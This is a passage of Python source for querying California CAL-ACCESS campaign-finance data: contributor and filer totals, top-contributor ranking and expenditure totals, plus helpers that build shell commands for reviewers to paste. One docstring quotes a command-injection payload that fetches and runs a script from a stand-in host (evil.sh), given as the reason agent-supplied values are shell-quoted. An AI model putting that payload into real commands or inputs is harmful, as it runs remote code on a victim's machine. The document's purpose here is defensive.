        firsts = json.loads(row["firsts"])
        # A late giver counts too, when their name could be nobody's here: a surname shared
        # with another giver is ambiguous whichever form that giver is on, and the detail would
        # otherwise put their gift under it. One name filed another way is still one giver.
        known = [_name_words(contributor, f) for f in firsts]
        givers = {_name_words(e["naml"], e["namf"]) for e in late}
        others = {w for w in givers if not any(_could_be(w, k) for k in known)}
        people = len(firsts) + len(others)
        if people > 1:
            # Summing several people under one surname is how a nonexistent contributor
            # appeared.
            con.close()
            return QueryResult(value=None, rows=gifts, found=False,
                               detail=f"{gifts} itemized {label} gift(s) across {people} "
                                      "DIFFERENT first names — this is not one contributor; "
                                      "pass contributor_first")
    left_out = _unread(gifts - n)
    if n == 0:
        # The name matched, but no gift states an amount: unknown money, never "$0.00".
        con.close()
        note = _late_note(late)
        return _no_rows(f"0 itemized {label} gift(s) counted{left_out}"
                        + (f"; {note}" if note else ""))
    total = float(row["amt"])
    detail = f"{n} itemized {label} gift(s){left_out}"
    if late and gated:
        # A schedule-A total that is known to be short. Green, it is a finding: "gave $5,000",
        # a week after a $50,000 late gift.
        con.close()
        return QueryResult(value=None, rows=n, found=False, suggestions=["form_type=A"],
                           detail=f"${total:,.2f} across {detail}, but {_late_note(late)} — not "
                                  "a complete total; form_type=A gives the schedule-A figure "
                                  "alone, for a person to check against these late reports")
    unrestated = _receipt_shares(con, inner, args, row["ids"])
    con.close()
    if note := _late_note(late, NOT_COMPLETE):
        detail += f"; {note}"
    # Asked for by name, the schedule's figure as filed, held for a person while a late gift is
    # pending: the note alone would render green.
    return QueryResult(value=total, rows=n, detail=detail, unrestated=unrestated,
                       late=_by_report(late))


def _filer_total(root: Path, *, filer_id: str, form_type: str | None = None) -> QueryResult:
    """Total itemized contributions received by a filer.

    `form_type` defaults to A (monetary contributions received). Without it the total mixed
    schedules A, C and I and came out hundreds of thousands of dollars high: a plausible-looking
    number answering a question nobody asked. Pass another schedule to count that one, or ""
    for every schedule.

    Left unset, it is a miss while the filer has a late-reported gift no schedule A restates yet
    (`_pending_late`), as `contributor_total` is. form_type=A gives the schedule-A figure alone,
    which does not verify while one is pending (`QueryResult.unsettled`).
    """
    from . import calaccess

    gated, form_type = _gate(form_type)
    schedule, schedule_args, label = _schedule(form_type)
    con = calaccess.connect_citable(root)
    late = _late_reports(con, filer_id, form_type)
    inner = DEDUPED_RECEIPTS.format(extra=schedule)
    args: list[Any] = [str(filer_id)] + schedule_args
    row = con.execute(f"""
        SELECT SUM(d.AMT) amt, COUNT(d.AMT) n, COUNT(*) gifts,
               GROUP_CONCAT(DISTINCT CASE WHEN d.AMT IS NOT NULL THEN d.FILING_IDS END) ids
        FROM ({inner}) d
    """, args).fetchone()
    n, gifts = int(row["n"] or 0), int(row["gifts"] or 0)
    left_out = _unread(gifts - n)
    if n == 0:
        note, hint = _elsewhere(con, filer_id, form_type)
        con.close()
        late_note = _late_note(late)
        return _no_rows(f"no {label} contributions" + (" counted" if left_out else "")
                        + f" for filer {filer_id}{left_out}{note}"
                        + (f"; {late_note}" if late_note else ""), hint)
    detail = f"{n} itemized {label} gift(s){left_out}"
    if late and gated:
        con.close()
        return _no_rows(f"${float(row['amt']):,.2f} across {detail}, but "
                        f"{_late_note(late)} — not a complete total; form_type=A gives the "
                        "schedule-A figure alone, for a person to check against these late "
                        "reports", ["form_type=A"])
    unrestated = _receipt_shares(con, inner, args, row["ids"])
    con.close()
    note = _late_note(late, NOT_COMPLETE)
    return QueryResult(value=float(row["amt"]), rows=n,
                       detail=detail + (f"; {note}" if note else ""), unrestated=unrestated,
                       late=_by_report(late))


def _top_contributor(root: Path, *, filer_id: str,
                     form_type: str | None = None) -> QueryResult:
    """The single largest contributor to a filer, by itemized total.

    Grouped by last AND first name: CTRIB_NAML is the surname for individuals, so grouping on
    it alone merged every unrelated donor sharing one, reporting a top contributor who does not
    exist.

    `form_type` defaults to A (monetary contributions received), as `filer_total` does. Ranked
    over every receipt schedule, a vendor's refund or a bank's interest (I) could name a
    business that gave nothing "the largest contributor", and an in-kind item (C) could decide
    between two donors. Pass another schedule to rank by that one, or "" for every schedule.

    A tie is every contributor within half a cent (TOLERANCE) of the top, listed whole however
    many there are, sorted by name as displayed (first name first), ignoring case. A large tie is not refused: the whole set is a true answer
    that reproduces, the detail says it is no single largest contributor, and a cap would be an
    arbitrary number turning that answer into a miss.

    Left unset, it is a miss when a late-reported gift no schedule A restates yet
    (`_pending_late`) could change the answer: when adding a contributor's pending late gifts
    to their schedule-A total could reach the top, or a late gift could break a tie. A late
    gift that cannot is named in the detail, and the ranking stands. form_type=A ranks
    schedule A alone, and does not verify while a late gift could change it
    (`QueryResult.unsettled`).
    """
    from . import calaccess

    gated, form_type = _gate(form_type)
    schedule, schedule_args, label = _schedule(form_type)
    con = calaccess.connect_citable(root)
    late = _late_reports(con, filer_id, form_type)
    inner = DEDUPED_RECEIPTS.format(extra=schedule)
    args: list[Any] = [str(filer_id)] + schedule_args
    # Only gifts with an amount are ranked: read as 0.0, a contributor whose gifts all had blank
    # amounts tied one whose stated total was $0. The rest are counted, by a window over every
    # contributor, so the dedup runs once. A contributor with no readable gift sums to NULL,
    # which sorts last and is never ranked.
    group = f"""
        SELECT d.CTRIB_NAML nm, d.CTRIB_NAMF nf, SUM(d.AMT) amt, COUNT(d.AMT) n,
               SUM(COUNT(*) - COUNT(d.AMT)) OVER () unread, UPPER(TRIM(d.CTRIB_NAML)) kl,
               UPPER(TRIM(COALESCE(d.CTRIB_NAMF,''))) kf
        FROM ({inner}) d
        GROUP BY UPPER(TRIM(d.CTRIB_NAML)), UPPER(TRIM(COALESCE(d.CTRIB_NAMF,'')))
    """
    # Every contributor's total, not the first few: a tie is everyone at the top. Fetched with
    # LIMIT 4, five givers at the contribution limit came back as a four-way tie naming
    # whichever four SQLite picked, and that value reproduced. The names order equal totals, so
    # the tie and the late-report check below read them in one order.
    groups = con.execute(f"{group} ORDER BY amt DESC, kl, kf", args).fetchall()
    unread = int(groups[0]["unread"] or 0) if groups else 0
    groups = [g for g in groups if g["amt"] is not None]
    row = groups[0] if groups else None
    if row is None:
        note, hint = _elsewhere(con, filer_id, form_type)
        con.close()
        late_note = _late_note(late)
        return _no_rows(f"no {label} contributions {'counted' if unread else 'found'} for "
                        f"filer {filer_id}{_unread(unread)}{note}"
                        + (f"; {late_note}" if late_note else ""), hint)
    top = float(row["amt"] or 0)
    tied = [r for r in groups if abs(float(r["amt"] or 0) - top) < TOLERANCE]
    names = [" ".join(x for x in (r["nf"], r["nm"]) if x).strip() for r in tied]
    # Sorted as displayed, ignoring case. Each name is spelled as one of its group's rows,
    # whichever SQLite reads, so a case-sensitive sort put "Rue ABBOT" before "Rue Aaron" or
    # after it depending on that row, and `matches()` ignores case but not order.
    listed = " | ".join(sorted(names, key=str.casefold))
    if unread:
        # A total can say "the stated gifts come to X" and name what it left out. A rank
        # cannot: a gift of unknown size could make anyone largest, so while one exists no
        # contributor is established as the largest. The stated leader is named as a lead to
        # check by hand, not a finding.
        con.close()
        lead = names[0] if len(tied) == 1 else f"a {len(tied)}-way tie ({listed})"
        return _no_rows(f"{lead} leads the stated amounts at ${top:,.0f} in {label} gifts, but "
                        f"no largest contributor can be named{_unread(unread, ' to this filer')}")
    # Past the check above, every contributor has a readable total: none sums to NULL.
    contenders, moving = [], []
    if late:
        contenders, moving = _could_change_ranking(groups, tied, top, late, label)
    if contenders and gated:
        con.close()
        more = f"; and {len(contenders) - 3} more" if len(contenders) > 3 else ""
        return _no_rows(f"{listed} lead{'s' if len(tied) == 1 else ''} "
                        f"schedule A at ${top:,.0f}, but {_late_note(late)} could change the "
                        f"ranking: {'; '.join(contenders[:3])}{more} — not a settled ranking; "
                        "form_type=A ranks schedule A alone, for a person to check against "
                        "these late reports", ["form_type=A"])
    # Every gift, not only the top contributor's: the ranking is made of all of them, and a
    # gift a later amendment dropped can put someone at the top, or keep someone off it.
    ids = con.execute(f"""
        SELECT GROUP_CONCAT(DISTINCT d.FILING_IDS) ids FROM ({inner}) d
        WHERE d.AMT IS NOT NULL
    """, args).fetchone()["ids"]
    unrestated = _receipt_shares(con, inner, args, ids)
    con.close()
    note = _late_note(late, ", not counted — they " + (
        "could change the ranking" if contenders else "cannot change the ranking"))
    note = f"; {note}" if note else ""
    # Held for a person only when one could change it, naming the ones that could: a ranking no
    # late gift can move stands, and a report that cannot move it is not the one to open. If no
    # contender holds a late entry of its own, the ranking is still unsettled, so every late
    # report is held rather than none: holding none would let it verify.
    held = _by_report(moving or late) if contenders else []
    if len(tied) > 1:
        # ORDER BY ... LIMIT 1 makes an arbitrary pick among equals, and a verifier rightly
        # rejected a "largest contributor" that was really a two-way tie. Return the tie.
        return QueryResult(value=listed, rows=len(tied),
                           detail=f"{len(tied)}-WAY TIE at ${top:,.0f} in {label} gifts — not "
                                  "a single largest contributor; do not word this as one"
                                  + note, unrestated=unrestated, late=held)
    return QueryResult(value=names[0], rows=int(row["n"] or 0),
                       detail=f"${top:,.0f} across {row['n']} {label} gift(s){note}",
                       unrestated=unrestated, late=held)


def _could_change_ranking(groups: list[Any], tied: list[Any], top: float,
                          late: list[dict[str, Any]],
                          label: str) -> tuple[list[str], list[dict[str, Any]]]:
    """(who the pending late entries could put at the top, described; the entries held against
    them). Both empty if nobody.

    Every contributor could end anywhere from their total plus every negative pending amount
    to it plus every positive one, as if no entry were a copy of another, and an unreadable
    amount could be anything. A late entry counts for every contributor it could be
    (`_could_be`). A late name that could be nobody on the schedule is a giver of its own, and
    every late entry that could be them counts for them too: names that could all be one giver
    are each within the fullest of them, so that name's range holds all of their gifts. Each of
    these only widens a range, which only makes the answer refuse more often. The answer stands
    if nobody outside the leaders could come within a cent of the lowest a leader could fall
    to, and no leader of a tie could move.
    """
    scheduled = {(g["kl"], g["kf"]): float(g["amt"] or 0) for g in groups}
    names = {(g["kl"], g["kf"]): " ".join(x for x in (g["nf"], g["nm"]) if x).strip()
             for g in groups}
    words = {(g["kl"], g["kf"]): _name_words(g["nm"], g["nf"]) for g in groups}
    # Givers only the late reports name. Found before any entry is counted, so each is held
    # against every late entry, not only those after it: counted as they came, "Ada Quennell"
    # joined an earlier "Ada C Quennell" and never "Ada B Quennell", and a $3,000 gift under
    # each of her names fell short of a $5,000 leader she might pass.
    on_schedule = list(words.values())
    for e in late:
        mine = _name_words(e["naml"], e["namf"])
        if not any(_could_be(mine, w) for w in on_schedule):
            words.setdefault(("", mine), mine)
            names.setdefault(("", mine), " ".join(x for x in (e["namf"], e["naml"]) if x)
                             .strip())
    lo = dict(scheduled)
    hi = dict(scheduled)
    owed: dict[Any, list[float | None]] = {}
    entries: dict[Any, list[dict[str, Any]]] = {}
    for e in late:
        mine = _name_words(e["naml"], e["namf"])
        a = e["amt"]
        for k in [k for k, w in words.items() if _could_be(mine, w)]:
            lo.setdefault(k, 0.0)
            hi.setdefault(k, 0.0)
            owed.setdefault(k, []).append(a)
            entries.setdefault(k, []).append(e)
            lo[k] = -float("inf") if a is None else lo[k] + min(a, 0.0)
            hi[k] = float("inf") if a is None else hi[k] + max(a, 0.0)
    # Ordered as the tie is, so the leaders who could move list in one order: as a set they
    # listed by hash, which changes from one process to the next.
    leaders = dict.fromkeys((r["kl"], r["kf"]) for r in tied)
    floor = min(lo[k] for k in leaders)
    could = [k for k in hi if k not in leaders and hi[k] > floor - TOLERANCE]
    if len(leaders) > 1:
        could += [k for k in leaders if lo[k] <= top - TOLERANCE or hi[k] >= top + TOLERANCE]
    elif could:
        could += [k for k in leaders if lo[k] <= top - TOLERANCE]

    def described(k: Any) -> str:
        amounts = owed.get(k) or []
        late_part = ("no late gift" if not amounts else "a late amount nobody stated"
                     if None in amounts else f"${sum(a or 0.0 for a in amounts):,.0f} late")
        return (f"{names[k] or 'an unnamed giver'} (${scheduled.get(k, 0.0):,.0f} on {label}, "
                f"{late_part})")

    moving = {id(e): e for k in could for e in entries.get(k, [])}
    return [described(k) for k in sorted(could, key=lambda k: -hi[k])], list(moving.values())


def _ie_total(root: Path, *, candidate_last: str, first: str = "", stance: str = "",
              since: str = "", until: str = "") -> QueryResult:
    """Total late independent expenditures naming a candidate.

    `since`/`until` are ISO dates (YYYY, YYYY-MM or YYYY-MM-DD) bounding the expenditure
    date, inclusive at their own precision: until="2025" runs through 12/31/2025. Without them
    2006 and 2026 are summed together, which cannot answer a question about either race: a
    candidate's unfiltered support figure can be dominated by a campaign for another office
    years earlier.
    """
    from . import calaccess

    # Refused, not used: "10/14/2025" compared against normalized dates filters by string
    # order, and a total from the wrong window still matches its own recorded `expected`.
    window, window_args = date_window_sql("d", since, until)
    if not first.strip():
        # Asked for a surname alone this returned 22x the real figure: most of it belonged to a
        # different candidate with the same surname, in another county and year. A surname
        # is not a candidate, and there is no page or snippet downstream to catch it.
        raise ValueError(
            "ie_total needs `first`: a surname alone mixes candidates (in testing it returned "
            "22x the real figure, mostly a different person). Pass the first name.")

    # Refuses a database whose covers carry no amendment ids: this total could include money a
    # later amendment gave to another candidate.
    con = calaccess.connect_citable(root)
    match = name_match_sql("c.CAND_NAML", "c.CAND_NAMF", first)
    args: list[Any] = name_args(candidate_last, first)
    if stance:
        match += " AND UPPER(c.SUP_OPP_CD) = UPPER(?)"
        args.append(stance[:1])
    # EXP_DATE is "M/D/YYYY 12:00:00 AM" text, so a string comparison would sort 5/24/2026
    # before 10/14/2014: window the normalized date instead. A row whose date did not
    # normalize cannot be placed inside a window, so it stays out of one, as it always has --
    # but it is counted, and the detail says so, rather than dropped without a word. The real
    # export has 31 such rows, all with a blank amount.
    dated = real_date_sql("d") if window else "1"   # with no window, d is never computed
    inside = f"({dated} AND {window})" if window else "1"
    # A blank AMOUNT is money nobody stated, not $0 (`amount_sql()`): NULL here, left out of the
    # sum AND the count, and named in the detail. The real export has 33 blanks and nothing
    # else unreadable.
    amount = amount_sql("s.AMOUNT")
    matched = f"""
        SELECT fid, amt, {dated} AS dated, {inside} AS inside
        FROM (SELECT s.FILING_ID fid, {amount} amt, {iso_date_sql("s.EXP_DATE")} d
              FROM S496_LATEST s JOIN CVR_LATEST c ON c.FILING_ID = s.FILING_ID
              WHERE {match})
    """
    row = con.execute(f"""
        SELECT SUM(CASE WHEN inside THEN amt END) amt, SUM(inside AND amt IS NOT NULL) n,
               SUM(inside AND amt IS NULL) unread_n,
               SUM(NOT dated) undated_n, SUM(CASE WHEN NOT dated THEN amt END) undated_amt
        FROM ({matched})
    """, window_args + args).fetchone()
    n = int(row["n"] or 0)
    span = f"{since or '...'}..{until or '...'}"
    left_out = ""
    if row["unread_n"]:
        left_out += f"; {row['unread_n']} more with no readable amount, not counted"
    if window and row["undated_n"]:
        # an unreadable AMOUNT has no money to report; say nothing rather than "$0.00"
        undated_amt = float(row["undated_amt"] or 0)
        left_out += (f"; {row['undated_n']} more with no readable date, not counted"
                     + (f" (${undated_amt:,.2f} between them)" if undated_amt else ""))
    if n == 0:
        # The failure this guard exists for: a committee filed the candidate's whole name in
        # the last-name field, so a (last, first) filter found nothing and SUM() returned 0.0:
        # a confident "nobody spent against them", wrong by the largest expenditure in the race.
        near = [f"{r['nl']!r}/{r['nf']!r} {r['so']} "
                + (f"${float(r['amt']):,.0f}" if r["amt"] is not None else "no readable amount")
                for r in con.execute(f"""
            SELECT c.CAND_NAML nl, c.CAND_NAMF nf, c.SUP_OPP_CD so, SUM({amount}) amt
            FROM S496_LATEST s JOIN CVR_LATEST c ON c.FILING_ID = s.FILING_ID
            WHERE UPPER(c.CAND_NAML) LIKE UPPER(?) OR UPPER(c.CAND_NAMF) LIKE UPPER(?)
            GROUP BY UPPER(TRIM(c.CAND_NAML)), UPPER(TRIM(c.CAND_NAMF)), c.SUP_OPP_CD
            ORDER BY amt DESC LIMIT 6
        """, (f"%{candidate_last.strip()}%", f"%{candidate_last.strip()}%"))]
        con.close()
        # "counted": with rows left out, there were expenditures -- just none this can sum
        return _no_rows(f"no {stance or 'any'}-stance expenditures"
                        + (" counted" if left_out else "")
                        + (f" in {span}" if window else "") + left_out, near)
    # Only the rows the total counts: one left out of the window, or with no readable amount,
    # has no share in it.
    unrestated = calaccess.unrestated_shares(con, "S496_CD", [
        ([r["fid"]], float(r["amt"]), int(r["n"])) for r in con.execute(f"""
            SELECT fid, SUM(amt) amt, COUNT(*) n FROM ({matched})
            WHERE inside AND amt IS NOT NULL GROUP BY fid
        """, window_args + args)])
    con.close()
    return QueryResult(value=float(row["amt"] or 0), rows=n, unrestated=unrestated,
                       detail=f"{n} expenditure(s)"
                              + (f", {span}{left_out}" if window else
                                 f"{left_out} — NO DATE FILTER, may span multiple races"))


class Query(NamedTuple):
    fn: Callable[..., QueryResult]
    required: tuple[str, ...]
    description: str
    # Which definition this is. A verdict on a query citation was formed about one calculation,
    # and the sid (name + params + expected) does not cover the calculation — so a definition
    # that changed but happened to return the same number would keep a verdict about the old
    # one. Every name here has already returned different numbers after a fix (amendment,
    # cover-record and cross-form dedup; the first-name requirement). A verdict recorded under
    # another version is stale (`judgments.is_stale()`), and `vg verify` says which.
    #
    # BUMP IT when a change can alter what the query returns for ANY input the previous
    # version accepted, even if every recorded figure still reproduces: dedup, name matching,
    # what a parameter or a date bound means, a newly required parameter, refusing an input
    # that used to return a value. The recorded figures reproducing is not the test — the
    # verifier judged the calculation, not only its output.
    # DON'T bump for what cannot change a value: wording of `detail` or an error, near-match
    # suggestions, speed, a new optional parameter whose default keeps the old behaviour.
    # When unsure, bump: the cost is re-judging this query's verdicts once; the cost of not
    # bumping is a verdict vouching for a calculation nobody checked.
    #
    # A comment is not a gate. `test_a_query_definition_cannot_change_unnoticed` pins each
    # query's (version, fingerprint of its code and of every shared helper and dedup view it
    # runs through) and fails on any change, so the decision above is made on purpose, in the
    # diff a reviewer reads, rather than skipped.
    version: int


REGISTRY: dict[str, Query] = {
    # v2 of the three receipt queries: an AMOUNT that is not a number is left out of the sum and
    # the count and named (`amount_sql()`), where v1 read it as $0.00 -- or, for "1,000", $1.
    # v3 of contributor_total and top_contributor: schedule A only by default, as filer_total
    # already was. v2 summed every receipt schedule, refunds and interest included.
    # v4 of those two and v3 of filer_total: each refuses a database whose covers carry no
    # amendment ids (connect_citable), which the earlier versions answered from. ie_total
    # already refused one, so its value and its refusals are unchanged, and it stays at v2. The
    # unrestated flag every query now carries changes no value: verification acts on it.
    # v4 of filer_total: a padded form_type is refused (`_schedule`). v3 ran " " as a filter for
    # the receipts with no schedule and returned their sum.
    # v5 of the three: with form_type unset, a miss while a late-reported gift that no schedule
    # A restates yet could change the answer (`_pending_late`).
    # v6 of the three: with form_type A or "" named, a database that cannot read Form 497
    # refuses where v5 answered. The value is otherwise unchanged; a pending late gift now holds
    # it for a person (`QueryResult.late`), which verification acts on.
    # v7 of top_contributor: a tie is every contributor at the top. v6 built it from the first
    # four rows, so a tie of five or more named four of them.
    "calaccess.contributor_total": Query(
        _contributor_total, ("filer_id", "contributor"),
        "contributions from one contributor (add contributor_first for an individual; "
        "schedule A unless form_type says otherwise; a miss while a late gift is pending)", 6),
    "calaccess.filer_total": Query(
        _filer_total, ("filer_id",),
        "total itemized contributions received by a filer (schedule A unless form_type says "
        "otherwise; a miss while a late gift is pending)", 6),
    "calaccess.top_contributor": Query(
        _top_contributor, ("filer_id",),
        "the largest contributor to a filer, by itemized total (schedule A unless form_type "
        "says otherwise; a miss while a pending late gift could change it)", 7),
    "calaccess.ie_total": Query(
        _ie_total, ("candidate_last", "first"),
        "late independent expenditures naming a candidate; pass stance and since/until", 2),
}


def dataset(name: str) -> str:
    """The dataset a query named `name` reads, by the namespace of its name ("" for none)."""
    return {"calaccess": "CAL-ACCESS"}.get(name.split(".", 1)[0], "")


def describe_export(export_date: str, data: str = "CAL-ACCESS") -> str:
    """How every message names the export a figure came from — `vg query`, `vg judge`,
    `vg judgments` and the review page — so a reviewer comparing them reads one phrasing."""
    if export_date:
        return f"the {data} export of {export_date}"
    return (f"an undated {data} database (built before exports were dated; rebuild it with "
            f"`vg calaccess build`)")


def export_date(name: str, root: Path) -> str:
    """The date of the export a query named `name` reads under `root`, or "" if unknown."""
    if dataset(name) != "CAL-ACCESS":
        return ""
    from . import calaccess

    return calaccess.export_info(root).get("export_date", "")


# Unicode's whole Default_Ignorable_Code_Point set (DerivedCoreProperties.txt), not a sample:
# code points that render as nothing. str.isprintable() already rejects the Cf/Cn ones (bidi
# overrides, zero-width), but the letters and marks among them pass it — U+3164 HANGUL
# FILLER, U+034F COMBINING GRAPHEME JOINER, the variation selectors. Plus U+2800 BRAILLE
# PATTERN BLANK, which is not "ignorable" but renders as nothing all the same.
_INVISIBLE = re.compile(
    r"[­͏؜ᅟᅠ឴឵᠋-᠏​-‏‪-‮"
    r"⁠-⁯⠀ㅤ︀-️﻿ﾠ￰-￸"
    r"\U0001bca0-\U0001bca3\U0001d173-\U0001d17a\U000e0000-\U000e0fff]")
_QUERY_NAME = re.compile(r"[A-Za-z0-9_]+(?:\.[A-Za-z0-9_]+)*")
_PARAM_KEY = re.compile(r"[A-Za-z_][A-Za-z0-9_]*")


def unprintable(text: str) -> bool:
    """Whether `text` holds a character a pasted command cannot carry as displayed: a control
    character, or one that renders as nothing (`_INVISIBLE`, or anything str.isprintable()
    rejects). The one rule for every value printed into `human_command()`."""
    return not text.isprintable() or bool(_INVISIBLE.search(text))


def unsafe_reason(name: str, params: dict[str, str]) -> str | None:
    """Why this query cannot be printed as a command a reviewer can safely paste, or None.

    The name, keys and values are agent-authored, and `human_command` hands them to a human's
    shell. Quoting makes any printable text inert; it cannot help with the rest:
    - a control character acts on the terminal before the shell parses a quote (^C abandons
      the line; an embedded end-of-bracketed-paste turns what follows into keystrokes);
    - a name starting with `-` is read by `vg query` as an option, quoted or not;
    - a key holding `=` is split differently by `vg query` than it was by verification;
    - an invisible character (`_INVISIBLE`, or anything str.isprintable() rejects) makes the
      command on screen differ from the one copied.
    The messages never echo the text. The cost, measured: 84 of ~1.2M distinct contributor
    names in the CAL-ACCESS export carry control bytes (stray \\x02/\\x0b/\\x12, and C1 bytes
    from double-encoded accents), and those contributors cannot be cited by query. Cite the
    filing page instead. No candidate name or filer id in the export is affected.
    """
    if not _QUERY_NAME.fullmatch(str(name)):
        return "query name must be a dotted registry name (letters, digits, _ and .)"
    for k, v in params.items():
        if not _PARAM_KEY.fullmatch(str(k)):
            return "query parameter names must be identifiers (letters, digits and _)"
        if unprintable(str(v)):
            return f"query parameter {k} contains a control or invisible character"
    return None


def run(name: str, params: dict[str, str], root: Path) -> QueryResult:
    # Unknown names first, so a typo gets the list of real ones rather than a charset rule.
    if name not in REGISTRY:
        raise ValueError(f"unknown query {name!r}; known: {', '.join(sorted(REGISTRY))}")
    # QueryCitation already refuses these at load. Checked again at the one door verify,
    # revalidation and the CLI all use, because a citation the reviewer cannot re-run must not
    # be green even where the query would ignore the character (`stance` keeps only its first).
    if reason := unsafe_reason(name, params):
        raise ValueError(reason)
    query = REGISTRY[name]
    missing = [p for p in query.required if not params.get(p)]
    if missing:
        raise ValueError(f"{name} needs {', '.join(missing)}")
    result = query.fn(root, **params)
    result.version = query.version
    result.export_date = export_date(name, root)
    return result


def matches(expected: Any, got: Any) -> bool:
    """Compare a recorded result to a fresh one.

    A None on either side matches only None: a miss is never a zero (see `_no_rows`).
    The query's return TYPE picks the comparison, so a new query must choose it deliberately:
    - an `int` is a count and compares exactly: '12.004' is not a count of 12;
    - a `float` is a dollar figure and must agree to the cent (TOLERANCE). Every numeric query
      today returns one. A count returned as `float(n)` would get the cent tolerance, and a
      ratio would need a comparison of its own;
    - anything else (a contributor's name) compares as trimmed, case-folded text.
    """
    if got is None or expected is None:
        return got == expected
    # Dispatch on what the query returned BEFORE parsing `expected`: a text result that looks
    # numeric ("100.00") must compare as text, or it would get the dollar tolerance.
    if isinstance(got, bool) or not isinstance(got, (int, float)):
        return str(expected).strip().casefold() == str(got).strip().casefold()
    try:
        e = float(str(expected).replace(",", "").lstrip("$"))
    except ValueError:
        return False
    if isinstance(got, int):
        return e == got
    return abs(e - got) < TOLERANCE


def human_command(name: str, params: dict[str, str], cache_root: str | None = None) -> str:
    """The command a reviewer copies and runs to check this themselves.

    `cache_root` is the root the figure was checked against (`QueryRun.cache_root`). Pass it
    whenever it is known: without `--cache`, `vg query` resolves its own root from `--data`,
    so a figure verified with `vg verify --cache X` printed a command reading a different
    database, or none — a green row its own command could not reproduce.

    The review page hands this string to a human to paste into a shell, and the name, keys
    and values are all agent-authored — so each is `shlex.quote`d as data. Quoting only values
    containing a space, and with repr, let `$(curl${IFS}-s${IFS}evil.sh|sh)` through bare:
    code execution on the reviewer's machine, delivered by the verification step.

    shlex.quote targets POSIX shells (sh, bash, zsh). fish reads `\\'` inside single quotes as
    an escaped quote, so a value ending in a backslash would unbalance its quoting; the review
    page says which shells the command is for.

    What quoting cannot neutralize (`unsafe_reason`) gets no command at all: "", which the
    review page renders as nothing to copy. QueryCitation refuses such a query at load, so
    this is the backstop for one built without validation.
    """
    if unsafe_reason(name, params):
        return ""
    cache = ""
    if cache_root:
        root = str(cache_root)
        if unprintable(root):
            # QueryRun refuses this at load; this is the backstop for one assigned after
            # validation. Same rule as a parameter: nothing to copy, not a command unlike its
            # display.
            return ""
        # A relative root starting with '-' would read as an option.
        cache = f" --cache {shlex.quote(root if not root.startswith('-') else './' + root)}"
    args = "".join(f" --param {shlex.quote(str(k))}={shlex.quote(str(v))}"
                   for k, v in params.items())
    return f"uv run vg query {shlex.quote(name)}{cache}{args}"
